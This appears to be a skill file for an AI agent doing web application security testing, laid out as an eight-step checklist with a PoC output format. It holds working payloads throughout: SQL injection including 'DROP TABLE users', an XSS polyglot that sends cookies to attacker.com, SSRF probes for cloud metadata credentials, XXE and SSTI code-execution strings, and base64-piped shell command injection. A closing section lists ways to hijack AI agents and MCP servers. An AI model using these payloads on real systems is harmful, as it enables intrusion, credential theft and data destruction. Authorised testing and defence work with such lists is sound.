---
name: web-sec
description: Web application security testing. Use when testing web apps for OWASP Top 10, injection, XSS, SSRF, XXE, SSTI, auth bypass, IDOR, file upload, deserialization, or business logic flaws. Triggers on "web", "owasp", "injection", "xss", "sqli", "ssrf", "ssti", "idor", "upload".
category: web
tags: web,owasp,injection,xss,sqli,ssrf,ssti,idor,xxe,deserialization
---

# Web Application Security Testing

## Step 1: Technology Fingerprint

- Headers: Server, X-Powered-By, X-AspNet-Version, X-Runtime
- Cookies: framework indicators (PHPSESSID, JSESSIONID, ASP.NET_SessionId)
- JavaScript: framework detection (React, Angular, Vue, jQuery versions)
- Error pages: stack traces, version info, debug endpoints
- Source maps: .map files, source code leaks
- AI indicators: /api/chat, /api/completions, /mcp, /.well-known/ai-plugin.json

## Step 2: Attack Surface Mapping

- API endpoints: /api/v1, /graphql, /swagger, /openapi.json
- Admin panels: /admin, /dashboard, /management, /console
- Hidden files: /.git, /.env, /.htaccess, /robots.txt, /sitemap.xml
- Backup files: /backup, /db.sql, /site.tar.gz, /config.bak
- Debug endpoints: /debug, /trace, /actuator, /health
- AI/LLM endpoints: /api/chat, /api/completions, /api/models, /mcp
- MCP endpoints: /mcp, /mcp/health, /mcp/config, /.mcp.json

## Step 3: Injection Testing

### SQL Injection
- UNION SELECT, blind (boolean/time), stacked queries, error-based
- `' UNION SELECT NULL,NULL,NULL--`
- `' OR 1=1--`
- `'; DROP TABLE users--`
- `sqlmap -u "URL" --batch --dbs --risk=2 --level=3`

### NoSQL Injection
- MongoDB operators: $gt, $ne, $regex
- `{"$regex": ".*"}` | `{"$gt": ""}` | `{"$ne": null}`

### XSS
- Reflected: every query param, body field, header
- Stored: post via API, then load as victim
- DOM: innerHTML, document.write, eval sinks in JS bundles
- Polyglots: `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=fetch('//attacker.com/?c='+btoa(document.cookie)) )//%0D%0A//</stYle/<titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e`

### SSRF
- `http://169.254.169.254/latest/meta-data/`
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- `file:///etc/passwd`
- `gopher://internal-service:port/_command`
- DNS rebinding: `http://make-169-254-169-254-rebind.127.0.0.1.nip.io`

### XXE
- `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`
- Blind: external DTD host → %dtd; → exfil
- Vectors: SVG upload, XLSX/DOCX (OOXML)

### SSTI
- Jinja2: `{{7*7}}`, `{{config.items()}}`, `{{''.__class__.__mro__[1].__subclasses__()}}`
- Twig: `{{['id']|filter('system')}}`
- FreeMarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`
- SpEL: `T(java.lang.Runtime).getRuntime().exec("id")`

### Command Injection
- `; id`, `| id`, `` `id` ``, `$(id)`
- `; cat /etc/passwd`, `| whoami`
- IFS smuggling: `;echo${IFS}"RCE";`
- Base64 pipeline: `echo$IFS$1"Y2F0IC9ldGMvcGFzc3dk"|base64$IFS-d|sh`

## Step 4: Authentication Attacks

- Brute force: credential stuffing, password spraying
- JWT: none algorithm, weak secret, key confusion, token leakage
- OAuth: redirect URI manipulation, token theft, scope escalation
- Session: fixation, hijacking, cookie manipulation
- Password reset: token prediction, host header injection
- MFA bypass: response manipulation, fallback mechanisms
- API key: prediction, reuse, leakage in source code

## Step 5: Authorization Attacks

- IDOR: parameter manipulation, UUID prediction, path traversal
- BOLA: endpoint enumeration, role manipulation
- Privilege escalation: admin endpoint discovery, function hooking
- Horizontal: account takeover via session manipulation
- Vertical: role escalation via API abuse

## Step 6: Advanced Exploitation

- Deserialization: Java, Python pickle, PHP, Node.js, .NET
- Race conditions: TOCTOU, double-spend, concurrent requests
- Business logic: price manipulation, bypass flow, state confusion
- File upload: webshell upload, path traversal, polyglot files
- Path traversal: directory traversal, file inclusion, symlink attacks
- Cache poisoning: web cache deception, host header injection
- WebSocket: hijacking, cross-site WebSocket hijacking

## Step 7: AI Agent Attacks (2026)

- Direct prompt injection: override system instructions
- Indirect prompt injection: poison data sources agent reads
- Context poisoning: inject malicious instructions in documents
- Tool abuse: leverage agent tools for unauthorized actions
- Data exfiltration: extract training data, PII, secrets
- Intent flow subversion: hijack agent reasoning chain
- Cross-session leakage: extract data from other users' sessions

## Step 8: MCP Vulnerabilities (2026)

- Token mismanagement: extract hard-coded credentials
- Privilege escalation via scope creep: expand tool permissions
- Tool poisoning: inject malicious tool descriptions
- Supply chain attacks: compromised dependencies
- Command injection: exploit tool parameters
- Shadow MCP servers: find unauthorized deployments
- Context over-sharing: cross-session data leakage

## Output Format

```
[HIT] <vulnerability> at <endpoint>
  PoC: <exact request/payload>
  Impact: <CVSS score + description>
  Chain: -> <next attack>
```
